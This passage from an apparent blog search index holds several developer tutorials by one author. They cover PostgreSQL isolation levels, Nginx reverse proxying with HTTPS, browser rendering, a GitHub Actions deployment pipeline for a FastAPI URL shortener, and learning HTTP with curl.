too.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Durability-in-PostgreSQL--A-Deep-Dive-into-the--D--in-ACID-af42ce13fb2b/#references","title":"References","text":"<ul> <li>PostgreSQL: Write-Ahead Logging (WAL)</li> <li>PostgreSQL: Synchronous Commit</li> <li>PostgreSQL: Crash Recovery</li> </ul> <p>By Kfir Gisman on July 7, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/","title":"Understanding Isolation in PostgreSQL: A Deep Dive into the \u201cI\u201d in ACID","text":"<p>How does PostgreSQL keep your transactions from stepping on each other? Dive deep into Isolation- the \u2018I\u2019 in ACID -with real examples </p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#understanding-isolation-in-postgresql-a-deep-dive-into-the-i-in-acid_1","title":"Understanding Isolation in PostgreSQL: A Deep Dive into the \u201cI\u201d in ACID","text":"<p>Photo by Matheus Viana: https://www.pexels.com/photo/open-locker-in-wooden-locker-room-31220117/</p> <p>When we talk about PostgreSQL being ACID-compliant , Isolation is the \u201cI\u201d that quietly does a lot of heavy lifting. In my previous articles, we explored Atomicity and Consistency -how PostgreSQL makes sure that transactions either happen fully or not at all, and that the database remains valid. Now it\u2019s time to look at how Isolation keeps transactions from interfering with each other when multiple operations run at the same time.</p> <p>Isolation sounds simple: each transaction should run as if it\u2019s the only one. But the details can get tricky, especially when different isolation levels come into play. Let\u2019s see what this means, how it works in PostgreSQL, and what to watch out for.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#what-isolation-means","title":"What Isolation Means","text":"<p>In short, Isolation makes sure that the intermediate state of a transaction is invisible to other transactions. If one transaction is in the middle of changing a row, another transaction shouldn\u2019t see a half-finished version of that row.</p> <p>Without Isolation, you can run into problems like:</p> <ul> <li>Dirty reads : reading uncommitted changes that might get rolled back.</li> <li>Non-repeatable reads : getting different results when you read the same row twice in a transaction.</li> <li>Phantom reads : rows appear or disappear when you run the same query again.</li> </ul> <p>PostgreSQL handles this with different isolation levels, each balancing correctness and performance.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#postgresqls-isolation-levels","title":"PostgreSQL\u2019s Isolation Levels","text":"<p>PostgreSQL supports the standard SQL isolation levels:</p> <ol> <li>Read Uncommitted PostgreSQL actually treats this the same as Read Committed, so dirty reads are never allowed.</li> <li>Read Committed (default) Each query sees a snapshot of the database taken at the start of that query. Changes committed by other transactions become visible to the next query in the same transaction.</li> <li>Repeatable Read All queries in the transaction see the same snapshot taken when the transaction starts. You avoid non-repeatable reads, but phantom reads can still happen.</li> <li>Serializable The strictest level. Transactions run as if they were executed one after another. PostgreSQL uses Serializable Snapshot Isolation (SSI) to make this work and may abort transactions that can\u2019t be serialized.</li> </ol>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#lets-see-isolation-in-action","title":"Let\u2019s See Isolation in Action","text":"<p>Here\u2019s a simple table to experiment with:</p> <pre><code>CREATE TABLE inventory (  \n  id SERIAL PRIMARY KEY,  \n  stock INT  \n);\n\nINSERT INTO inventory (stock) VALUES (100);\n</code></pre> <p>Open two <code>psql</code> sessions: Session A and Session B.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#read-committed-non-repeatable-reads","title":"Read Committed: Non-Repeatable Reads","text":"<p>In Session A:</p> <pre><code>BEGIN;  \nSET TRANSACTION ISOLATION LEVEL READ COMMITTED;\n\nSELECT stock FROM inventory WHERE id = 1;  \n-- stock = 100\n</code></pre> <p>In Session B:</p> <pre><code>UPDATE inventory SET stock = 50 WHERE id = 1;  \nCOMMIT;\n</code></pre> <p>Back in Session A:</p> <pre><code>SELECT stock FROM inventory WHERE id = 1;  \n-- stock = 50\n</code></pre> <p>The same row gave a different value within the same transaction. This is a non-repeatable read, and it\u2019s allowed in Read Committed.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#repeatable-read-same-snapshot","title":"Repeatable Read: Same Snapshot","text":"<p>Now try Repeatable Read.</p> <p>Session A:</p> <pre><code>BEGIN;  \nSET TRANSACTION ISOLATION LEVEL REPEATABLE READ;\n\nSELECT stock FROM inventory WHERE id = 1;  \n-- stock = 100\n</code></pre> <p>Session B:</p> <pre><code>UPDATE inventory SET stock = 30 WHERE id = 1;  \nCOMMIT;\n</code></pre> <p>Back in Session A:</p> <pre><code>SELECT stock FROM inventory WHERE id = 1;  \n-- stock = 100\n</code></pre> <p>This time, the value stays the same because Repeatable Read ensures you always see the same snapshot.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#serializable-strictest-isolation","title":"Serializable: Strictest Isolation","text":"<p>With Serializable, PostgreSQL checks whether your transactions could produce different results than if they ran one after the other.</p> <p>Session A:</p> <pre><code>BEGIN;  \nSET TRANSACTION ISOLATION LEVEL SERIALIZABLE;\n\nSELECT stock FROM inventory WHERE id = 1;  \n-- 100\n\nUPDATE inventory SET stock = stock - 10 WHERE id = 1;\n</code></pre> <p>Session B:</p> <pre><code>BEGIN;  \nSET TRANSACTION ISOLATION LEVEL SERIALIZABLE;\n\nSELECT stock FROM inventory WHERE id = 1;  \n-- 100\n\nUPDATE inventory SET stock = stock - 20 WHERE id = 1;  \nCOMMIT;\n</code></pre> <p>Back in Session A:</p> <pre><code>COMMIT;  \n-- ERROR: could not serialize access due to concurrent update\n</code></pre> <p>PostgreSQL detects that running these transactions together could lead to inconsistencies, so it rolls one back. Better safe than sorry.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#choosing-the-right-level","title":"Choosing the Right Level","text":"<ul> <li>Read Committed works well for most use cases where short transactions don\u2019t need repeatable reads.</li> <li>Repeatable Read is useful for consistent reads in longer transactions or reports.</li> <li>Serializable is the safest but can lead to transaction rollbacks, so you need to handle retries.</li> </ul>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#final-thoughts","title":"Final Thoughts","text":"<p>Isolation is about making sure your transactions don\u2019t see each other\u2019s work half-finished. It\u2019s not something you think about every day- until things go wrong because of subtle race conditions.</p> <p>Getting Isolation right is key to safe and predictable data in multi-user systems. Now you know what each level does and how PostgreSQL keeps your data consistent even when things get busy.</p>"},{"location":"blog/old-blogs/2025-07-07_Understanding-Isolation-in-PostgreSQL--A-Deep-Dive-into-the--I--in-ACID-c493d635a35b/#references","title":"References","text":"<ul> <li>PostgreSQL: Isolation Levels</li> <li>PostgreSQL: Serializable Isolation</li> </ul> <p>By Kfir Gisman on July 7, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/","title":"Demystifying Nginx: From Reverse Proxy to Secure Gateway","text":"<p>When I started building TinyURL, a simple FastAPI + PostgreSQL service for shortening URLs, I thought Nginx would just \u201cserve traffic.\u201d\u2026 </p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#demystifying-nginx-from-reverse-proxy-to-secure-gateway_1","title":"Demystifying Nginx: From Reverse Proxy to Secure Gateway","text":"<p>Photo by RealToughCandy.com: https://www.pexels.com/photo/person-holding-a-sticker-with-green-letters-11035538/</p> <p>When I started building TinyURL , a simple FastAPI + PostgreSQL service for shortening URLs, I thought Nginx would just \u201cserve traffic.\u201d Turns out, it became the most critical piece of my deployment \u2014 the gatekeeper that made everything behind it work smoothly and securely.</p> <p>In this post, I\u2019ll share what I actually learned while wiring Nginx into my FastAPI backend and Streamlit frontend, both running in Docker.</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#1-nginx-is-more-than-a-web-server","title":"1. Nginx is more than a web server","text":"<p>Before this project, I mostly thought of Nginx as something you use to \u201chost static files.\u201d In reality, it\u2019s a powerful reverse proxy \u2014 it sits in front of your app, receives every incoming request, and decides where it should go.</p> <p>In my stack:</p> <pre><code>Client \u2192 Nginx \u2192 FastAPI (backend) \u2192 Postgres  \n                     \u21b3 Streamlit (UI)\n</code></pre> <p>Nginx doesn\u2019t just forward traffic- it also:</p> <ul> <li>Handles HTTPS termination</li> <li>Adds security headers</li> <li>Manages WebSocket upgrades for Streamlit</li> <li>Hides internal services (FastAPI and Postgres) from the public internet</li> </ul> <p>Once I saw that flow working inside Docker Compose, it finally clicked how production apps are structured.</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#2-reverse-proxying-is-all-about-headers-and-trust","title":"2. Reverse proxying is all about headers and trust","text":"<p>Here\u2019s a simplified version of my production config:</p> <pre><code>location /api/ {  \n    proxy_pass http://fastapi:8000;  \n    proxy_set_header Host $host;  \n    proxy_set_header X-Real-IP $remote_addr;  \n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  \n    proxy_set_header X-Forwarded-Proto $scheme;  \n}\n</code></pre> <p>These headers are crucial. Without them, FastAPI would have no idea what the original client\u2019s IP or scheme was. <code>X-Forwarded-Proto</code> in particular tells the backend if the original request came over HTTPS- that\u2019s how FastAPI can generate correct redirect URLs or absolute links.</p> <p>This part made me appreciate how Nginx \u201ctranslates\u201d external requests for internal services while preserving client context.</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#3-https-is-not-optional","title":"3. HTTPS is not optional","text":"<p>The first time I tried running my app on an EC2 instance, Chrome immediately complained: \u201cNot secure.\u201d</p> <p>That\u2019s when I integrated Let\u2019s Encrypt with Nginx. The setup was surprisingly simple once I understood what was happening:</p> <ul> <li>The <code>/.well-known/acme-challenge/</code> path lets Certbot verify domain ownership.</li> <li>Once validated, Let\u2019s Encrypt issues free SSL certificates.</li> <li> <p>Nginx then terminates HTTPS using those certs:</p> <p>ssl_certificate /etc/letsencrypt/live/kg-tiny-url.xyz/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/kg-tiny-url.xyz/privkey.pem; ssl_protocols TLSv1.2 TLSv1.3;</p> </li> </ul> <p>I also learned to add a separate HTTP server block just to redirect everything to HTTPS. Small detail, big difference.</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#4-security-headers-are-free-wins","title":"4. Security headers are free wins","text":"<p>I wanted to understand what real production configs look like, so I dug into HTTP security headers. Adding these took one line each in Nginx but instantly hardened the app:</p> <pre><code>add_header Strict-Transport-Security \"max-age=31536000\" always;  \nadd_header X-Frame-Options \"DENY\" always;  \nadd_header X-Content-Type-Options \"nosniff\" always;  \nadd_header Content-Security-Policy \"default-src 'self'\" always;\n</code></pre> <p>You don\u2019t notice them in daily use, but tools like Mozilla Observatory or Lighthouse will thank you.</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#5-docker-networking-just-works-if-you-name-things-right","title":"5. Docker networking just works- if you name things right","text":"<p>Inside Docker Compose, every container gets a DNS name. My <code>proxy_pass http://fastapi:8000</code> line works because the FastAPI container is literally named fastapi in the YAML file.</p> <p>That\u2019s how Nginx can find it without any IP addresses. Once I realized that Docker\u2019s internal DNS makes service discovery effortless, networking suddenly felt simple instead of scary.</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#6-the-moment-it-all-worked","title":"6. The moment it all worked","text":"<p>After wiring it all up, I opened my browser to:</p> <pre><code>https://kg-tiny-url.xyz/ui/\n</code></pre> <p>The Streamlit UI loaded. When I shortened a link, it called the FastAPI backend through <code>/api/</code>. Everything was encrypted, routed, and logged properly- all through Nginx.</p> <p>That was the moment I understood why every real-world deployment uses a reverse proxy.</p>"},{"location":"blog/old-blogs/2025-10-14_Demystifying-Nginx--From-Reverse-Proxy-to-Secure-Gateway-149c75b99ad8/#7-final-takeaway","title":"7. Final takeaway","text":"<p>Nginx isn\u2019t just a traffic router- it\u2019s the security layer, performance booster, and network translator that makes containerized apps production-ready.</p> <p>By the end of this project, I didn\u2019t just \u201cset up Nginx.\u201d I learned how the internet actually talks to my code.</p> <p>If you\u2019re new to Nginx or just want to deepen your understanding, I highly recommend pairing this write-up with this free YouTube tutorial (https://www.youtube.com/watch?v=7VAI73roXaY) for a hands-on introduction, and the Udemy \u201cNGINX Crash Course\u201d (https://www.udemy.com/course/nginx-crash-course/?kw=ngi&amp;src=sac) for a more structured, in-depth path. These two resources helped me grasp concepts like reverse proxying, SSL termination, WebSocket upgrades, and scaling more confidently \u2014 and I think they\u2019ll help you too.</p> <p>By Kfir Gisman on October 14, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/","title":"How the Browser Works","text":"<p>Most of us use browsers every day, but few understand how they actually work under the hood. Knowing this helps us write more efficient\u2026 </p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#how-the-browser-works_1","title":"How the Browser Works","text":"<p>Photo by Jonny Caspari on Unsplash</p> <p>Most of us use browsers every day, but few understand how they actually work under the hood. Knowing this helps us write more efficient, predictable web applications \u2014 and, honestly, it\u2019s just fascinating.</p> <p>Let\u2019s take a look at what happens when you open a webpage, step by step.</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#the-browser-is-almost-an-operating-system","title":"The Browser Is Almost an Operating System","text":"<p>A modern browser isn\u2019t just a window to the web- it\u2019s a small operating system. It manages memory, processes, file storage, networking, rendering, JavaScript execution, and a user interface layer.</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#browser-capabilities","title":"Browser Capabilities","text":"<ul> <li>Networking: Fetch resources over HTTP(S).</li> <li>Data storage: Cookies, localStorage, IndexedDB.</li> <li>Execution: Run JavaScript securely in a sandboxed environment.</li> <li>Rendering: Parse and paint HTML and CSS.</li> <li>UI: Manage tabs, buttons, and the visual interface.</li> </ul> <p>Each of these parts works together seamlessly- and it all starts with fetching and parsing data.</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#behind-the-scenes-browser-architecture","title":"Behind the Scenes: Browser Architecture","text":"<p>At a high level, a browser consists of:</p> <ul> <li>UI Layer: What you interact with- address bar, tabs, etc.</li> <li>Data Storage Layer: Where cookies, cache, and site data live.</li> <li>Browser Engine: The core that coordinates everything. It\u2019s divided into two main parts:</li> <li>Rendering Engine: Parses HTML and CSS, creates the visual output.</li> <li>JavaScript Engine: Parses, compiles, and executes JS code.</li> </ul> <p>Examples:</p> <ul> <li>Blink (used by Chrome, Edge, Opera)</li> <li>WebKit (used by Safari)</li> <li>Gecko (used by Firefox)</li> </ul>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#the-html-journey","title":"The HTML Journey","text":"<p>When you load a webpage, here\u2019s what happens to the HTML file:</p> <ol> <li>Get raw bytes from the network.</li> <li>Convert bytes \u2192 characters using the correct encoding (e.g., UTF-8).</li> <li>Tokenize the characters into meaningful pieces \u2014 e.g., <code>&lt;h1&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;div&gt;</code>.</li> <li>Build objects for each element (with parent/child/sibling relationships).</li> <li>Construct the DOM (Document Object Model) \u2014 a live tree structure representing the page.</li> </ol> <p>The DOM isn\u2019t just a static representation- it\u2019s interactive. JavaScript can modify it, and the browser will update the display accordingly.</p> <p>Reference: HTML Living Standard</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#css-and-the-render-tree","title":"CSS and the Render Tree","text":"<p>CSS follows a similar process:</p> <ol> <li>Parse raw bytes \u2192 characters \u2192 tokens \u2192 nodes.</li> <li>Build the CSSOM (CSS Object Model)- representing all style rules.</li> <li>Combine the DOM + CSSOM \u2192 Render Tree.</li> <li>The render tree goes through:</li> </ol> <ul> <li>Layout: Calculating sizes and positions.</li> <li>Painting: Filling pixels on the screen.</li> </ul> <p>The rendering engine handles this- running complex optimizations to repaint only what\u2019s needed.</p> <p>Reference: CSSOM Specification</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#javascript-the-dom-manipulator","title":"JavaScript: The DOM Manipulator","text":"<p>When the browser encounters a <code>&lt;script&gt;</code> tag, it pauses HTML and CSS parsing to execute JavaScript.</p> <p>That\u2019s because JavaScript can modify the DOM or request additional resources, so the browser needs to know the final structure before continuing.</p> <p>However, this can block rendering if the CSSOM isn\u2019t ready yet- since the script might depend on styles.</p> <p>To avoid blocking, we can use:</p> <pre><code>&lt;script src=\"app.js\" defer&gt;&lt;/script&gt;\n</code></pre> <ul> <li><code>**defer**</code> tells the browser to continue parsing HTML and execute JS after the DOM is ready.</li> <li><code>**async**</code> executes JS as soon as it\u2019s downloaded, independently of DOM parsing.</li> </ul> <p>Reference: HTML Spec- Script Element</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#putting-it-all-together","title":"Putting It All Together","text":"<p>Here\u2019s a simplified flow:</p> <pre><code>HTML \u2192 DOM  \nCSS \u2192 CSSOM  \nDOM + CSSOM \u2192 Render Tree \u2192 Layout \u2192 Paint  \nJS \u2192 Can manipulate DOM/CSSOM \u2192 Re-render\n</code></pre> <p>Every click, scroll, or animation triggers a careful dance between these systems.</p>"},{"location":"blog/old-blogs/2025-10-20_How-the-Browser-Works-4026ab114d78/#why-it-matters","title":"Why It Matters","text":"<p>Understanding how browsers work helps you:</p> <ul> <li>Write non-blocking, performant code.</li> <li>Optimize paint and layout cycles.</li> <li>Debug complex rendering or loading issues.</li> <li>Appreciate just how much happens before your app even loads.</li> </ul> <p>Browsers are one of the most sophisticated pieces of software on your machine- and now you know why.</p> <p>Further Reading:</p> <ul> <li>MDN: How browsers work</li> </ul> <p>By Kfir Gisman on October 20, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/","title":"Shipping FastAPI Like a Pro: My CI/CD Pipeline for TinyURL","text":"<p>When I first deployed TinyURL- my FastAPI + Postgres + Nginx URL shortener-I wanted a workflow that felt real, not just docker compose up\u2026 </p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#shipping-fastapi-like-a-pro-my-cicd-pipeline-for-tinyurl_1","title":"Shipping FastAPI Like a Pro: My CI/CD Pipeline for TinyURL","text":"<p>Photo by Jan Zakelj: https://www.pexels.com/photo/a-person-holding-yellow-pipes-9389356/</p> <p>When I first deployed TinyURL- my FastAPI + Postgres + Nginx URL shortener-I wanted a workflow that felt real, not just <code>docker compose up</code> on my laptop. So I built a simple but solid CI/CD pipeline using GitHub Actions that runs tests, builds containers, and deploys automatically.</p> <p>Here\u2019s what I learned and how it all fits together.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#1-cicd-isnt-about-tools-its-about-trust","title":"1. CI/CD isn\u2019t about tools- it\u2019s about trust","text":"<p>The main goal wasn\u2019t automation for its own sake. It was to reach a point where every push to <code>main</code> could safely go live- no surprises, no \u201cworks on my machine.\u201d</p> <p>That mindset helped me design a pipeline that checks, builds, and ships with zero manual steps.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#2-the-build-pipeline-test-early-build-once","title":"2. The build pipeline: test early, build once","text":"<p>Here\u2019s a simplified view of my GitHub Actions workflow (<code>.github/workflows/deploy.yml</code>):</p> <pre><code>name: Deploy TinyURL\n\non:  \n  push:  \n    branches:  \n      - main  \njobs:  \n  build-and-deploy:  \n    runs-on: ubuntu-latest  \n    steps:  \n      - name: Checkout repo  \n        uses: actions/checkout@v4  \n      - name: Set up Python  \n        uses: actions/setup-python@v5  \n        with:  \n          python-version: 3.11  \n      - name: Install dependencies  \n        run: pip install -r requirements.txt  \n      - name: Run tests  \n        run: pytest -q  \n      - name: Build Docker images  \n        run: docker compose -f docker-compose.prod.yml build  \n      - name: Deploy via SSH  \n        env:  \n          HOST: ${{ secrets.EC2_HOST }}  \n          KEY: ${{ secrets.EC2_SSH_KEY }}  \n        run: |  \n          echo \"$KEY\" &gt; key.pem  \n          chmod 600 key.pem  \n          scp -i key.pem docker-compose.prod.yml ubuntu@$HOST:/home/ubuntu/tinyurl/  \n          ssh -i key.pem ubuntu@$HOST \"cd /home/ubuntu/tinyurl &amp;&amp; docker compose -f docker-compose.prod.yml up -d --build\"\n</code></pre> <p>This is the heartbeat of my project:</p> <ul> <li>Every push triggers the pipeline.</li> <li>Tests must pass before anything deploys.</li> <li>The build happens once , and that same build runs in production.</li> </ul>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#3-containerization-made-cicd-predictable","title":"3. Containerization made CI/CD predictable","text":"<p>The biggest win came from using Docker Compose for both local and production setups.</p> <p>My dev environment runs three containers:</p> <ul> <li><code>db</code> (Postgres)</li> <li><code>fastapi</code> (backend)</li> <li><code>nginx</code> (reverse proxy)</li> </ul> <p>And my production setup? Exactly the same- except the compose file uses:</p> <ul> <li>Different environment variables</li> <li>Mounted SSL certs from Let\u2019s Encrypt</li> <li>No auto-reload or debugging</li> </ul> <p>Because both stacks share the same Docker config, the CI/CD pipeline doesn\u2019t need special cases or hacks. If it runs locally, it\u2019ll run in CI.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#4-deployment-zero-downtime-one-command","title":"4. Deployment: zero downtime, one command","text":"<p>Once the new image is built and pushed, the EC2 host just pulls and restarts containers with:</p> <pre><code>docker compose -f docker-compose.prod.yml up -d --build\n</code></pre> <p>Nginx handles live traffic, so backend containers can restart without downtime. Since FastAPI and Nginx talk over Docker\u2019s internal network, there\u2019s no need for manual reconfiguration.</p> <p>That \u201cclick \u2192 push \u2192 deploy\u201d feeling is addictive.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#5-secrets-are-sacred","title":"5. Secrets are sacred","text":"<p>The pipeline uses GitHub Secrets to store:</p> <ul> <li><code>EC2_HOST</code> (server IP or domain)</li> <li><code>EC2_SSH_KEY</code> (private key)</li> <li><code>POSTGRES_PASSWORD</code></li> <li><code>FASTAPI_SECRET_KEY</code></li> </ul> <p>No plaintext credentials in the repo, no <code>.env</code> files in commits. That alone made me sleep better at night.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#6-what-i-learned-the-hard-way","title":"6. What I learned the hard way","text":"<ul> <li>Don\u2019t skip tests- failing fast is cheaper than debugging in production.</li> <li>Don\u2019t rebuild images on the server- build once, deploy the same artifact.</li> <li>Keep Docker tags consistent- otherwise <code>latest</code> will surprise you.</li> <li>Automate HTTPS renewal s- my Let\u2019s Encrypt cron job now runs monthly.</li> </ul> <p>These small habits make the pipeline boring- and boring pipelines are the best kind.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#7-the-result","title":"7. The result","text":"<p>Now every push to <code>main</code> runs tests, builds containers, and ships a fully reproducible environment to production. No manual steps, no \u201cdid I rebuild?\u201d anxiety. Just continuous confidence.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#tech-stack-recap","title":"Tech Stack Recap","text":"<ul> <li>FastAPI- backend API</li> <li>PostgreSQL- database</li> <li>Streamlit- frontend</li> <li>Nginx- reverse proxy</li> <li>GitHub Actions- CI/CD</li> <li>Docker Compose- orchestration</li> </ul> <p>\u201cCI/CD isn\u2019t about speed- it\u2019s about peace of mind.\u201d</p> <p>This post is part of my TinyURL series- real-world lessons from turning a small FastAPI project into a production-grade service.</p>"},{"location":"blog/old-blogs/2025-11-02_Shipping-FastAPI-Like-a-Pro--My-CI-CD-Pipeline-for-TinyURL-c27b68434f04/#a-message-from-our-founder","title":"A message from our Founder","text":"<p>Hey,Sunilhere. I wanted to take a moment to thank you for reading until the end and for being a part of this community.</p> <p>Did you know that our team run these publications as a volunteer effort to over 3.5m monthly readers? We don\u2019t receive any funding, we do this to support the community. \u2764\ufe0f</p> <p>If you want to show some love, please take a moment to follow me onLinkedIn,TikTok, Instagram. You can also subscribe to our weekly newsletter.</p> <p>And before you go, don\u2019t forget to clap and follow the writer\ufe0f!</p> <p>By Kfir Gisman on November 2, 2025.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/","title":"Why I Use curl Instead of Postman: Learning HTTP by Feel","text":"<p>Sometimes you don\u2019t need another GUI. You need to touch the protocol. While everyone opens Postman tabs, I open my terminal and type: </p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#why-i-use-curl-instead-of-postman-learning-http-by-feel_1","title":"Why I Use <code>curl</code> Instead of Postman: Learning HTTP by Feel","text":"<p>Photo by Kelly : https://www.pexels.com/photo/motor-bike-running-close-up-photography-2519374/</p> <p>Sometimes you don\u2019t need another GUI. You need to touch the protocol. While everyone opens Postman tabs, I open my terminal and type:</p> <pre><code>curl -X POST http://127.0.0.1:8000/api/shorten \\  \n  -H \"Content-Type: application/json\" \\  \n  -d '{\"url\": \"https://example.com\"}'\n</code></pre> <p>That\u2019s it- raw, direct, and honest. No buttons, no noise. Just HTTP, right under your fingertips.</p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#learning-through-the-fingertips","title":"Learning Through the Fingertips","text":"<p>Typing the request yourself makes every part of HTTP visible.</p> <ul> <li><code>-X POST</code> chooses the verb with intent</li> <li><code>-H</code> sets the headers precisely</li> <li><code>-d</code> sends the data explicitly</li> </ul> <p>And when you hit enter, you see exactly what the server gives back:</p> <pre><code>{\"short_url\": \"http://localhost:8000/000001\"}\n</code></pre> <p>Every <code>curl</code> command teaches you the rhythm of request and response- the web\u2019s real heartbeat.</p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#seeing-the-protocol-not-the-ui","title":"Seeing the Protocol, Not the UI","text":"<p>When you use <code>curl -v</code>, the terminal becomes your microscope:</p> <pre><code>curl -v http://127.0.0.1:8000/api/000001\n</code></pre> <p>You see every move:</p> <pre><code>&gt; GET /api/000001 HTTP/1.1  \n&gt; Host: 127.0.0.1:8000  \n&gt; User-Agent: curl/8.7.1  \n&gt; Accept: */*  \n&lt; HTTP/1.1 307 Temporary Redirect  \n&lt; location: https://example.com/\n</code></pre> <p>The protocol becomes transparent. You understand what\u2019s happening, not just that something happened.</p>"},{"location":"blog/old-blogs/2025-11-10_Why-I-Use-curl-Instead-of-Postman--Learning-HTTP-by-Feel-2fd88ef90fb7/#discovering-more","title":"Discovering More","text":"<p>The beauty of <code>curl</code> is in its depth. You don\u2019t have to memorize- you explore.</p> <pre><code>curl --help  \ncurl --help all | less\n</code></pre> <p>Each flag opens a new door like:</p> <ul> <li><code>-I</code> fetch headers only</li> <li><code>-L</code> follow redirects automatically</li> <li><code>-o</code> save output to a file</li> <li><code>-w \"%{http_code}\"</code> show only the response code</li> <li><code>-s</code> silent mode (no progress bar)</li> <li><code>-S</code> show errors even when silent</li> <li><code>-k</code> ignore SSL certificate checks</li> <li><code>-x http://proxy:8080</code> use a proxy</li> </ul> <p>The official docs are an endless rabbit hole of discovery: https://curl.se/docs/manpage.html</p> <p>If you don\u2019t want to leave the terminal, you can explore everything from the CLI itself. Here are a few ways to learn <code>curl</code> directly through your shell:</p> <pre><code># See all common options with short descriptions  \ncurl --help\n\n# See every possible flag and advanced usage  \ncurl --help all | less\n\n# Get a manual-style explanation (same as the website docs)  \nman curl\n\n# Search inside the manual for a specific flag  \nman curl | grep timeout\n\n# Quick reminder for a specific option  \ncurl --help | grep -i header\n</code></pre> <p>This is the beauty of <code>curl</code>: the docs live right where you work. You don\u2019t have to Google anything- the knowledge is built into the 